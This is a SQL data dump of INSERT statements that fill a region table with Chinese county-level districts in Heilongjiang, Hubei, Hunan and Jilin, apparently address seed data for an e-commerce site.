INSERT INTO `ec22703249_region` VALUES ('1433', '167', '木兰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1434', '167', '延寿县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1435', '168', '萨尔图区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1436', '168', '红岗区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1437', '168', '龙凤区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1438', '168', '让胡路区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1439', '168', '大同区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1440', '168', '肇州县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1441', '168', '肇源县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1442', '168', '林甸县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1443', '168', '杜尔伯特', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1444', '169', '呼玛县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1445', '169', '漠河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1446', '169', '塔河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1447', '170', '兴山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1448', '170', '工农区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1449', '170', '南山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1450', '170', '兴安区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1451', '170', '向阳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1452', '170', '东山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1453', '170', '萝北县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1454', '170', '绥滨县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1455', '171', '爱辉区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1456', '171', '五大连池市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1457', '171', '北安市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1458', '171', '嫩江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1459', '171', '逊克县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1460', '171', '孙吴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1461', '172', '鸡冠区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1462', '172', '恒山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1463', '172', '城子河区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1464', '172', '滴道区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1465', '172', '梨树区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1466', '172', '虎林市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1467', '172', '密山市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1468', '172', '鸡东县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1469', '173', '前进区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1470', '173', '郊区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1471', '173', '向阳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1472', '173', '东风区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1473', '173', '同江市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1474', '173', '富锦市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1475', '173', '桦南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1476', '173', '桦川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1477', '173', '汤原县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1478', '173', '抚远县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1479', '174', '爱民区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1480', '174', '东安区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1481', '174', '阳明区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1482', '174', '西安区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1483', '174', '绥芬河市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1484', '174', '海林市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1485', '174', '宁安市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1486', '174', '穆棱市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1487', '174', '东宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1488', '174', '林口县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1489', '175', '桃山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1490', '175', '新兴区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1491', '175', '茄子河区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1492', '175', '勃利县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1493', '176', '龙沙区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1494', '176', '昂昂溪区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1495', '176', '铁峰区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1496', '176', '建华区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1497', '176', '富拉尔基区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1498', '176', '碾子山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1499', '176', '梅里斯达斡尔区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1500', '176', '讷河市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1501', '176', '龙江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1502', '176', '依安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1503', '176', '泰来县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1504', '176', '甘南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1505', '176', '富裕县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1506', '176', '克山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1507', '176', '克东县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1508', '176', '拜泉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1509', '177', '尖山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1510', '177', '岭东区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1511', '177', '四方台区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1512', '177', '宝山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1513', '177', '集贤县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1514', '177', '友谊县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1515', '177', '宝清县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1516', '177', '饶河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1517', '178', '北林区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1518', '178', '安达市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1519', '178', '肇东市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1520', '178', '海伦市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1521', '178', '望奎县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1522', '178', '兰西县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1523', '178', '青冈县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1524', '178', '庆安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1525', '178', '明水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1526', '178', '绥棱县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1527', '179', '伊春区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1528', '179', '带岭区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1529', '179', '南岔区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1530', '179', '金山屯区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1531', '179', '西林区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1532', '179', '美溪区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1533', '179', '乌马河区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1534', '179', '翠峦区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1535', '179', '友好区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1536', '179', '上甘岭区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1537', '179', '五营区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1538', '179', '红星区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1539', '179', '新青区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1540', '179', '汤旺河区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1541', '179', '乌伊岭区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1542', '179', '铁力市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1543', '179', '嘉荫县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1544', '180', '江岸区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1545', '180', '武昌区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1546', '180', '江汉区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1547', '180', '硚口区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1548', '180', '汉阳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1549', '180', '青山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1550', '180', '洪山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1551', '180', '东西湖区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1552', '180', '汉南区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1553', '180', '蔡甸区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1554', '180', '江夏区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1555', '180', '黄陂区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1556', '180', '新洲区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1557', '180', '经济开发区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1558', '181', '仙桃市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1559', '182', '鄂城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1560', '182', '华容区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1561', '182', '梁子湖区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1562', '183', '黄州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1563', '183', '麻城市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1564', '183', '武穴市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1565', '183', '团风县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1566', '183', '红安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1567', '183', '罗田县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1568', '183', '英山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1569', '183', '浠水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1570', '183', '蕲春县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1571', '183', '黄梅县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1572', '184', '黄石港区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1573', '184', '西塞山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1574', '184', '下陆区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1575', '184', '铁山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1576', '184', '大冶市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1577', '184', '阳新县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1578', '185', '东宝区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1579', '185', '掇刀区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1580', '185', '钟祥市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1581', '185', '京山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1582', '185', '沙洋县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1583', '186', '沙市区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1584', '186', '荆州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1585', '186', '石首市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1586', '186', '洪湖市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1587', '186', '松滋市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1588', '186', '公安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1589', '186', '监利县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1590', '186', '江陵县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1591', '187', '潜江市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1592', '188', '神农架林区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1593', '189', '张湾区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1594', '189', '茅箭区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1595', '189', '丹江口市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1596', '189', '郧县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1597', '189', '郧西县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1598', '189', '竹山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1599', '189', '竹溪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1600', '189', '房县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1601', '190', '曾都区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1602', '190', '广水市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1603', '191', '天门市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1604', '192', '咸安区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1605', '192', '赤壁市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1606', '192', '嘉鱼县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1607', '192', '通城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1608', '192', '崇阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1609', '192', '通山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1610', '193', '襄城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1611', '193', '樊城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1612', '193', '襄阳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1613', '193', '老河口市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1614', '193', '枣阳市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1615', '193', '宜城市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1616', '193', '南漳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1617', '193', '谷城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1618', '193', '保康县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1619', '194', '孝南区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1620', '194', '应城市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1621', '194', '安陆市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1622', '194', '汉川市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1623', '194', '孝昌县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1624', '194', '大悟县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1625', '194', '云梦县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1626', '195', '长阳', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1627', '195', '五峰', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1628', '195', '西陵区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1629', '195', '伍家岗区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1630', '195', '点军区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1631', '195', '猇亭区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1632', '195', '夷陵区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1633', '195', '宜都市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1634', '195', '当阳市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1635', '195', '枝江市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1636', '195', '远安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1637', '195', '兴山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1638', '195', '秭归县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1639', '196', '恩施市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1640', '196', '利川市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1641', '196', '建始县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1642', '196', '巴东县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1643', '196', '宣恩县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1644', '196', '咸丰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1645', '196', '来凤县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1646', '196', '鹤峰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1647', '197', '岳麓区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1648', '197', '芙蓉区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1649', '197', '天心区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1650', '197', '开福区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1651', '197', '雨花区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1652', '197', '开发区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1653', '197', '浏阳市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1654', '197', '长沙县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1655', '197', '望城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1656', '197', '宁乡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1657', '198', '永定区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1658', '198', '武陵源区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1659', '198', '慈利县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1660', '198', '桑植县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1661', '199', '武陵区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1662', '199', '鼎城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1663', '199', '津市市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1664', '199', '安乡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1665', '199', '汉寿县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1666', '199', '澧县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1667', '199', '临澧县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1668', '199', '桃源县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1669', '199', '石门县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1670', '200', '北湖区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1671', '200', '苏仙区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1672', '200', '资兴市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1673', '200', '桂阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1674', '200', '宜章县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1675', '200', '永兴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1676', '200', '嘉禾县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1677', '200', '临武县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1678', '200', '汝城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1679', '200', '桂东县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1680', '200', '安仁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1681', '201', '雁峰区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1682', '201', '珠晖区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1683', '201', '石鼓区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1684', '201', '蒸湘区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1685', '201', '南岳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1686', '201', '耒阳市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1687', '201', '常宁市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1688', '201', '衡阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1689', '201', '衡南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1690', '201', '衡山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1691', '201', '衡东县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1692', '201', '祁东县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1693', '202', '鹤城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1694', '202', '靖州', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1695', '202', '麻阳', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1696', '202', '通道', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1697', '202', '新晃', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1698', '202', '芷江', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1699', '202', '沅陵县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1700', '202', '辰溪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1701', '202', '溆浦县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1702', '202', '中方县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1703', '202', '会同县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1704', '202', '洪江市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1705', '203', '娄星区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1706', '203', '冷水江市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1707', '203', '涟源市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1708', '203', '双峰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1709', '203', '新化县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1710', '204', '城步', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1711', '204', '双清区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1712', '204', '大祥区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1713', '204', '北塔区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1714', '204', '武冈市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1715', '204', '邵东县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1716', '204', '新邵县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1717', '204', '邵阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1718', '204', '隆回县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1719', '204', '洞口县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1720', '204', '绥宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1721', '204', '新宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1722', '205', '岳塘区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1723', '205', '雨湖区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1724', '205', '湘乡市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1725', '205', '韶山市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1726', '205', '湘潭县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1727', '206', '吉首市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1728', '206', '泸溪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1729', '206', '凤凰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1730', '206', '花垣县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1731', '206', '保靖县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1732', '206', '古丈县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1733', '206', '永顺县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1734', '206', '龙山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1735', '207', '赫山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1736', '207', '资阳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1737', '207', '沅江市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1738', '207', '南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1739', '207', '桃江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1740', '207', '安化县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1741', '208', '江华', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1742', '208', '冷水滩区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1743', '208', '零陵区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1744', '208', '祁阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1745', '208', '东安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1746', '208', '双牌县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1747', '208', '道县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1748', '208', '江永县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1749', '208', '宁远县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1750', '208', '蓝山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1751', '208', '新田县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1752', '209', '岳阳楼区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1753', '209', '君山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1754', '209', '云溪区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1755', '209', '汨罗市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1756', '209', '临湘市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1757', '209', '岳阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1758', '209', '华容县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1759', '209', '湘阴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1760', '209', '平江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1761', '210', '天元区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1762', '210', '荷塘区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1763', '210', '芦淞区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1764', '210', '石峰区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1765', '210', '醴陵市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1766', '210', '株洲县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1767', '210', '攸县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1768', '210', '茶陵县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1769', '210', '炎陵县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1770', '211', '朝阳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1771', '211', '宽城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1772', '211', '二道区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1773', '211', '南关区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1774', '211', '绿园区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1775', '211', '双阳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1776', '211', '净月潭开发区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1777', '211', '高新技术开发区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1778', '211', '经济技术开发区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1779', '211', '汽车产业开发区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1780', '211', '德惠市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1781', '211', '九台市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1782', '211', '榆树市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1783', '211', '农安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1784', '212', '船营区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1785', '212', '昌邑区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1786', '212', '龙潭区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1787', '212', '丰满区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1788', '212', '蛟河市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1789', '212', '桦甸市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1790', '212', '舒兰市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1791', '212', '磐石市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1792', '212', '永吉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1793', '213', '洮北区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1794', '213', '洮南市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1795', '213', '大安市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1796', '213', '镇赉县', '3', '0');
